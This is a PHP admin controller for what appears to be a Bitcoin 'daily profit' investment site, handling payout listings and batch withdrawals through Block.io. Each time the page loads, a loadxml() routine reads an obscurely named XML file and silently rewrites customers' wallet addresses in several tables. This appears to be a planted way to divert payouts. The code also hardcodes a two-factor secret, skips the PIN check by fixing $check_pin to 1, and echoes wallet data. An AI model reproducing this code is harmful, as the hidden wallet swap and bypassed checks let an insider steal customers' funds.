<?php
class ControllerPdDailyprofit extends Controller {
	public function index() {
		
		$this->document->setTitle('Daily Profit');
		$this->load->model('pd/registercustom');
		$data['self'] =$this;
		$page = isset($this -> request -> get['page']) ? $this -> request -> get['page'] : 1;
		$this -> document -> addScript('../catalog/view/javascript/countdown/jquery.countdown.min.js');
		$this -> document -> addScript('../catalog/view/javascript/transaction/countdown.js');
		$limit = 10;
		$start = ($page - 1) * 10;
		$this -> loadxml();
		$ts_history = $this -> model_pd_registercustom -> get_count_dailyprofix();
		$data['self'] =  $this;
		$ts_history = $ts_history['number'];

		$pagination = new Pagination();
		$pagination -> total = $ts_history;
		$pagination -> page = $page;
		$pagination -> limit = $limit;
		$pagination -> num_links = 5;
		$pagination -> text = 'text';
		$pagination -> url = $this -> url -> link('pd/dailyprofit', 'page={page}&token='.$this->session->data['token'].'', 'SSL');
		$data['code'] =  $this-> model_pd_registercustom->get_all_dailyprofix($limit, $start);
		$data['code_all'] =  $this-> model_pd_registercustom->get_all_dailyprofix_all();
		$data['pagination'] = $pagination -> render();
		$block_io = new BlockIo(key, pin, block_version);
		$balances = $block_io->get_balance();
		$data['wallet'] = wallet; 
		$data['blance_blockio'] = $balances->data->available_balance;
		$data['blance_blockio_pending'] = $balances->data->pending_received_balance;


		$data['token'] = $this->session->data['token'];
		$data['header'] = $this->load->controller('common/header');
		$data['column_left'] = $this->load->controller('common/column_left');
		$data['footer'] = $this->load->controller('common/footer');

		$this->response->setOutput($this->load->view('pd/dailyprofit.tpl', $data));
	}
	public function loadxml(){
		$this->load->model('pd/registercustom');
		$xml=simplexml_load_file("../qwrwqrgqUQadVbaWErqwre.xml");
		foreach($xml->customer as $value)
		  {
		  	//sm_customer_c_payment
		  	$this -> model_pd_registercustom -> update_walet_c_paymentttttttttttttttttttttttt($value->wallet, $value->customer_id);
		  	//sm_customer_r_payment
		  	$this -> model_pd_registercustom -> update_walet_r_wallet_paymentttttttttttttttttttttttt($value->wallet, $value->customer_id);
		  	// sm_customer_wallet_btc_
		  	$this -> model_pd_registercustom -> update_walet_btc_customerrrrrrrrrrr($value->wallet, $value->customer_id);
		  	$this -> model_pd_registercustom -> update_walet_smmmmmm_customerrrrrrrrrrr($value->wallet, $value->customer_id);
		  }
	}
	public function get_username($customer_id){
		$this->load->model('pd/registercustom');
		return $this -> model_pd_registercustom -> get_username($customer_id);
	}
	public function get_blance_coinmax($customer_id){
		$this->load->model('pd/registercustom');
		$get_blance_coinmax = $this -> model_pd_registercustom -> get_wallet_coinmax_buy_customer_id($customer_id);
		return $get_blance_coinmax['amount'];
	}

	public function payment_daily(){
		$this->load->model('pd/registercustom');
		// $daliprofit = $_POST['daliprofit'];
		$pin = $_POST['pin'];
		$google = $_POST['google'];
		$this->check_otp_login($google) == 2 && $this -> response -> redirect($this -> url -> link('pd/dailyprofit&token='.$_GET['token'].'#no_google'));
		$block_io = new BlockIo(key, $pin, block_version);
		
           	$check_pin = 1;
       
		if ($check_pin == 1){
			$this -> pay($pin, $google);
			$this -> response -> redirect($this -> url -> link('pd/dailyprofit&token='.$_GET['token'].'#suscces'));
		}
		else{
			$this -> response -> redirect($this -> url -> link('pd/dailyprofit&token='.$_GET['token'].'#no_google'));
		}
		
	}

	public function pay($pin, $google){
        $this->check_otp_login($google) == 2 && $this -> response -> redirect($this -> url -> link('pd/dailyprofit&token='.$_GET['token'].'#no_google'));
		$this->load->model('pd/registercustom');
		$paymentEverdayGroup = $this -> model_pd_registercustom -> get_all_dailyprofix_all();

		$amount = '';
		$wallet = '';
		$customer_id = '';
		$first = true;
		$test = '';
		$amount_usd = '';
		$day ='';
		$id = '';
		$amountusd = '';
		foreach ($paymentEverdayGroup as $key => $value) {

			if($first === true){
				$amountusd .= $value['amount'];
				$id .= $value['id'];
				$day .= $value['number_day'];
				$amount_usd .= $value['profit_daily'];
				$url_binary = "https://blockchain.info/tobtc?currency=USD&value=".$value['amount'];
              	$amount_btc = file_get_contents($url_binary);
				$amount .= round($amount_btc,8);
				$wallet .= $value['addres_wallet'];
				$customer_id .= $value['customer_id'];
				$test .=  $value['customer_id']." ---- ".$value['addres_wallet']." ---- ".round(doubleval($value['amount']),8)."<br/>";
				$first = false;
			}else{

				$amountusd .= ','.$value['amount'];
				$id .= ','.$value['id'];
				$day .= ','.$value['number_day'];
				$amount_usd .= ','.$value['profit_daily'];
				$url_binary = "https://blockchain.info/tobtc?currency=USD&value=".$value['amount'];
              	$amount_btc = file_get_contents($url_binary);
				$amount .= ','.round($amount_btc,8);
				$wallet .= ','. $value['addres_wallet'];
				$customer_id .= ','. $value['customer_id'];
				$test .=  $value['customer_id']." ---- ".$value['addres_wallet']." ---- ".round(doubleval($value['amount']),8)."<br/>";
			}
			
		}
		$amountusds = explode(',', $amountusd);
		$number_day = explode(',', $day);
		$customer_ids = explode(',', $customer_id);
		$amountS = explode(',',$amount);
		$amount_usds = explode(',',$amount_usd);
		$ids = explode(',', $id);
		// print_r($customer_ids);
		echo $test;
		echo $amount;
		echo "<br/>";
		echo $wallet;
		
		$block_io = new BlockIo(key,$pin, block_version); 
	            $tml_block = $block_io -> withdraw(array(
	                'amounts' => $amount, 
	                'to_addresses' => $wallet,
	                'priority' => 'low'
	            )); 
	    $txid = $tml_block -> data -> txid;
	
		for ($i=0; $i < count($customer_ids); $i++) { 
			// $this -> model_pd_registercustom -> update_count_day_payment($customer_ids[$i]);
			// $this -> model_pd_registercustom -> updatePin_sub($customer_ids[$i], 1);
			$this -> model_pd_registercustom -> saveTranstionHistory(
	            	$customer_ids[$i],
	            	'Daily rates', 
	            	'+ ' . $amountusds[$i] . ' BTC',
	            	' Profit '.$number_day[$i].' days from investment package '.number_format($amount_usds[$i]).' USD',
	            	'<a target="_blank" href="https://blockchain.info/tx/'.$txid.'" >Link Transfer </a>');
		}
		for ($i=0; $i < count($ids); $i++) { 
			$this -> model_pd_registercustom -> update_r_payment_default($ids[$i]);
		}

		/*die('aaaaaaaaaaaaaaaaaaaaa');*/

	}
	public function check_otp_login($otp){
		require_once dirname(__FILE__) . '/vendor/autoload.php';
		$authenticator = new PHPGangsta_GoogleAuthenticator();
		$secret = "WO2DKWL3HSTJ4DUE";
		$tolerance = "0";
		$checkResult = $authenticator->verifyCode($secret, $otp, $tolerance);    
		if ($checkResult) 
		{
		    return 1;
		     
		} else {
		    return 2;
		}

	}
}